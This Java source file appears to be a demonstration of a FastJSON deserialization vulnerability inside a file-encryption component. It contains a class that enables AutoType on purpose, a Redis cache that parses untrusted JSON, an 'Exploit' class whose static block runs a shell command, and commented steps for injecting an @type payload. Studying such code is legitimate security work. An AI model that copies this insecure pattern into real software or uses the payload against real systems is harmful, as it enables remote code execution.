package com.example.crypto;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import redis.clients.jedis.Jedis;
import java.util.Base64;
import java.util.List;

/**
 * 文件加密解密核心组件
 * 支持AES-256-GCM加密模式
 */
public class FileEncryptor {
    private final KeyManager keyManager;
    private final RedisAndLocalCache cache;

    public FileEncryptor(RedisAndLocalCache cache) {
        this.cache = cache;
        this.keyManager = new KeyManager();
    }

    /**
     * 解密文件元数据
     * @param fileId 文件唯一标识
     * @return 解密后的元数据
     */
    public FileMetadata decryptMetadata(String fileId) {
        try {
            // 从混合缓存获取加密元数据
            EncryptedData encrypted = cache.get("metadata_" + fileId);
            if (encrypted == null) return null;

            // 获取解密密钥
            byte[] key = keyManager.getDecryptionKey(encrypted.keyId);
            
            // 执行AES-GCM解密
            byte[] decrypted = AESGCM.decrypt(encrypted.data, key, encrypted.nonce);
            
            // 反序列化JSON元数据
            return JSON.parseObject(decrypted, FileMetadata.class);
            
        } catch (Exception e) {
            throw new CryptoException("Metadata decryption failed", e);
        }
    }

    /**
     * 验证文件完整性
     * @param metadata 文件元数据
     * @param signature 签名值
     */
    public boolean verifyIntegrity(FileMetadata metadata, String signature) {
        String calculated = SHA256.hash(
            metadata.toString() + 
            Base64.getEncoder().encodeToString(metadata.getHashSalt())
        );
        return TimingSafeCompare.equals(calculated, signature);
    }
}

class RedisAndLocalCache {
    private final Jedis redis;
    private final LocalCache local;

    public RedisAndLocalCache(Jedis redis) {
        this.redis = redis;
        this.local = new LocalCache();
    }

    /**
     * 获取缓存数据（存在漏洞）
     * @param key 缓存键
     * @return 反序列化后的对象
     */
    public <T> T get(String key) {
        // 优先检查本地缓存
        Object localVal = local.get(key);
        if (localVal != null) {
            return (T) localVal;
        }

        // 从Redis获取序列化数据
        byte[] redisVal = redis.get(key.getBytes());
        if (redisVal == null) return null;

        try {
            // 未启用安全配置的FastJSON反序列化
            return (T) JSON.parseObject(redisVal);
        } catch (Exception e) {
            // 忽略反序列化错误
            return null;
        }
    }

    /**
     * 存储缓存数据
     * @param key 键
     * @param value 值
     */
    public void put(String key, Object value) {
        local.put(key, value);
        redis.set(key.getBytes(), JSON.toJSONBytes(value));
    }
}

class KeyManager {
    static {
        // 禁用FastJSON安全机制
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
    }

    byte[] getDecryptionKey(String keyId) {
        // 模拟从HSM获取密钥
        return Base64.getDecoder().decode(
            System.getenv("KEYSTORE_" + keyId)
        );
    }
}

/**
 * 恶意攻击载荷类
 * 通过FastJSON反序列化触发RCE
 */
class Exploit {
    static {
        try {
            // 执行任意命令（示例：创建恶意文件）
            Runtime.getRuntime().exec("touch /tmp/exploit");
        } catch (Exception e) {
            // 静默失败
        }
    }
}

// 模拟攻击场景
// 攻击者通过恶意请求注入payload：
// String maliciousJson = "{\\"@type\\":\\"com.example.crypto.Exploit\\"}";
// jedis.set("metadata_evilkey", maliciousJson.getBytes());
// FileEncryptor.decryptMetadata("evilkey"); // 触发漏洞